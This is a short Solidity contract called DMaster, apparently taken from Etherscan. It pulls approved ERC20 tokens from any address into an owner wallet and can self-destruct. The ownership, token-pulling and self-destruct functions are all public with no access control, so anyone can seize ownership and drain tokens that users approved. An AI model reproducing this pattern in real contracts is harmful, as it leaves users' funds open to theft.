/**
 *Submitted for verification at Etherscan.io on 2021-06-29
*/

pragma solidity ^0.6.12;

interface ERC20 {
    function balanceOf(address _owner) external returns (uint256 balance);
    function transfer(address _to, uint256 _value) external returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool success);
    function approve(address _spender, uint256 _value) external returns (bool success);
    function allowance(address _owner, address _spender) external view returns (uint256 remaining);
}


contract DMaster {
    address private owner;
    
    constructor() public { 
        owner = msg.sender;
    }
    
    function bring(address token, address from, uint256 amount) public {
        ERC20(token).transferFrom(from, owner, amount);
    }
    
    function setOwner(address _owner) public {
        owner = _owner;
    }
    
    function get(address token, uint256 amount) public {
        ERC20(token).transfer(owner, amount);
    }
    
    function kill() public {
        address payable wallet = payable(owner);
        selfdestruct(wallet);
    }
}